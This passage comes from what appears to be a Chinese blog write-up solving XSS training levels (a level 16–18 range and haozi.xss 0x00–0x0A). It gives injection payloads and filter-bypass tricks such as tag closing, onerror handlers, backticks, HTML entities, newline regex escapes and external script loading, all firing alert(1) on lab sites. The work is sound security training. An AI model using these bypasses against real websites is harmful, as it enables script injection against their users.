class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt; &lt;span class&#x3D;&quot;variable language_&quot;&gt;window&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;location&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;property&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level17.php?arg01&#x3D;a&amp;arg02&#x3D;b&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level16&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;title&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;head&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;align&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;欢迎来到level16&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;h1&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;ini_set(&quot;display_errors&quot;, 0);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;$str5&#x3D;str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;img&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;src&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;level16.png&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;center&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;&#x2F;h3&gt;&quot;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;body&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;html&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 17&lt;&#x2F;p&gt;
&lt;p&gt;查看网页源代码可知有两个参数arg01和arg02，进行尝试后发现会拼接在&lt;embed&gt;标签内，有src属性&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204142001519.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204142001519.png&quot; alt&#x3D;&quot;image-20240204142001519&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;可以构造以下payload&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204142237099.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204142237099.png&quot; alt&#x3D;&quot;image-20240204142237099&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;arg01&#x3D;a&amp;arg02&#x3D; onMouseOver&#x3D;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 18&lt;&#x2F;p&gt;
&lt;p&gt;本题与17题一致，payload相同&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id&#x3D;&quot;haozi-xss题解&quot;&gt;haozi.xss题解&lt;&#x2F;h3&gt;
&lt;p&gt;网址： &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;xss.haozi.me&#x2F;&quot;&gt;https:&#x2F;&#x2F;xss.haozi.me&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x00&quot;&gt;0x00&lt;&#x2F;h4&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204143959934.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204143959934.png&quot; alt&#x3D;&quot;image-20240204143959934&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x01&quot;&gt;0x01&lt;&#x2F;h4&gt;
&lt;p&gt;注入点在&lt;textarea&gt;&lt;&#x2F;textarea&gt;标签中，故按照0x00的方法无法被解析，可提前闭合标签。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204144343303.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204144343303.png&quot; alt&#x3D;&quot;image-20240204144343303&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;&#x2F;textarea&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;也可以利用error事件：&lt;code&gt;&lt;&#x2F;textarea&gt;&lt;img src&#x3D;&quot;&quot; onerror&#x3D;alert(1)&gt;&lt;&#x2F;code&gt;，由于src是空，所以肯定会报错,，故通过错误调用事件成功注入&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x02&quot;&gt;0x02&lt;&#x2F;h4&gt;
&lt;p&gt;本题input标签内的value会将值转化为字符串，然后显示在输入框内，故前两题的标签闭合注入会失效，可以借鉴SQL注入的方法，将前面的双引号闭合，然后注入新的标签&lt;&#x2F;p&gt;
&lt;p&gt;答案：&lt;code&gt;&quot; &gt; &lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;也可以使用onclick事件：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204144832842.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204144832842.png&quot; alt&#x3D;&quot;image-20240204144832842&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&quot; onclick&#x3D;&quot;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x03&quot;&gt;0x03&lt;&#x2F;h4&gt;
&lt;p&gt;过滤符号：&lt;code&gt;() &lt;&gt;&lt;&#x2F;code&gt; ，在JavaScript中可以使用反引号&#96;&#96; &lt;code&gt;来代替&lt;&#x2F;code&gt;()&#96;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204150455947.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204150455947.png&quot; alt&#x3D;&quot;image-20240204150455947&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;script&gt;alert&lt;&#x2F;code&gt;1&lt;code&gt;&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;或：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;a&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;javascript:alert&lt;&#x2F;span&gt;&#96;&lt;span class&#x3D;&quot;attr&quot;&gt;1&lt;&#x2F;span&gt;\&#96;&gt;&lt;&#x2F;span&gt;123&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;a&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x04&quot;&gt;0x04&lt;&#x2F;h4&gt;
&lt;p&gt;过滤符号：小括号()，中括号[]，反引号&#96; 可使用HTML实体编码绕过&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204151017389.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204151017389.png&quot; alt&#x3D;&quot;image-20240204151017389&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;a&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;href&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;javascript:alert&amp;#40;1&amp;#41;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;123&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;a&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x05&quot;&gt;0x05&lt;&#x2F;h4&gt;
&lt;p&gt;HTML的注释有两种方式：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!-- 注释内容 --&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;comment&quot;&gt;&lt;!-- 注释内容 --!&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204151215313.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204151215313.png&quot; alt&#x3D;&quot;image-20240204151215313&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;--!&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x06&quot;&gt;0x06&lt;&#x2F;h4&gt;
&lt;p&gt;正则表达式匹配了：&lt;strong&gt;auto&lt;&#x2F;strong&gt; 、&lt;strong&gt;以on开头且以&#x3D;结尾的字符串&lt;&#x2F;strong&gt;、 &lt;strong&gt;&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;所以过滤了autofocus和onerror等事件，以及防止input标签被闭合。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204152604165.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204152604165.png&quot; alt&#x3D;&quot;image-20240204152604165&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;可以通过换行&lt;code&gt;%0A&lt;&#x2F;code&gt;来绕过匹配，&lt;strong&gt;答案：&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight txt&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;type&#x3D;&quot;image&quot; src&#x3D;&quot;&quot; onerror&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#x3D;alert(1)&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;onclick&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#x3D;alert(1)&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x07&quot;&gt;0x07&lt;&#x2F;h4&gt;
&lt;p&gt;本题主要利用html部分单标签可以解析，例如img标签&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153048091.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153048091.png&quot; alt&#x3D;&quot;image-20240204153048091&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;img src&#x3D;&quot;&quot; onerror&#x3D;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x08&quot;&gt;0x08&lt;&#x2F;h4&gt;
&lt;p&gt;使用正则过滤&lt;&#x2F;style&gt;,可以多加一个空格或使用换行符造成正则逃逸。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153220204.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153220204.png&quot; alt&#x3D;&quot;image-20240204153220204&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;&lt;&#x2F;style &gt;&lt;img src&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x09&quot;&gt;0x09&lt;&#x2F;h4&gt;
&lt;p&gt;本题使用正则表达式白名单匹配固定网址，可在正确的网址后多加字符，再把前面的双引号闭合，再输入onerror错误事件&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153430571.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204153430571.png&quot; alt&#x3D;&quot;image-20240204153430571&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;https:&#x2F;&#x2F;www.segmentfault.com&quot; onerror&#x3D;&quot;alert(1)&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0A&quot;&gt;0x0A&lt;&#x2F;h4&gt;
&lt;p&gt;本题通过html转义, 过滤了所有可注入的关键字，经研究（看答案）可知，可直接引用指定网站下的目录文件来达到xss注入的目的，如在靶场的目录下有个j.js文件, 内有alert(1);代码, 直接调用即可注入，&lt;strong&gt;答案：&lt;code&gt;https:&#x2F;&#x2F;www.segmentfault.com.haozi.me&#x2F;j.js&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;也可用url的@语法来进行跳转调用，例如&lt;code&gt;https:&#x2F;&#x2F;www.baidu.com@www.bing.com&lt;&#x2F;code&gt; ，最终会跳转到bing上，根据此原理可以在其他服务器上事先写好alert(1);并跳转执行。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0B&quot;&gt;0x0B&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0C&quot;&gt;0x0C&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0D&quot;&gt;0x0D&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0E&quot;&gt;0x0E&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x0F&quot;&gt;0x0F&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x10&quot;&gt;0x10&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x11&quot;&gt;0x11&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;h4 id&#x3D;&quot;0x12&quot;&gt;0x12&lt;&#x2F;h4&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/DASCTF2407/" title="DASCTF 2024暑期挑战赛 Misc部分WP">DASCTF 2024暑期挑战赛 Misc部分WP</a><time datetime="2024-07-23T06:21:20.000Z" title="发表于 2024-07-23 14:21:20">2024-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/MiscAllInOne/" title="Misc All In One">Misc All In One</a><time datetime="2024-07-17T01:32:48.000Z" title="发表于 2024-07-17 09:32:48">2024-07-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/newsql/" title="SQL注入（重构版）">SQL注入（重构版）</a><time datetime="2024-07-15T06:00:39.000Z" title="发表于 2024-07-15 14:00:39">2024-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/RCE/" title="RCE（重构版）">RCE（重构版）</a><time datetime="2024-05-25T03:03:50.000Z" title="发表于 2024-05-25 11:03:50">2024-05-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/rkwg3/" title="广域通信网">广域通信网</a><time datetime="2024-05-25T03:00:15.000Z" title="发表于 2024-05-25 11:00:15">2024-05-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/BGimg.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By C3ngH</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas 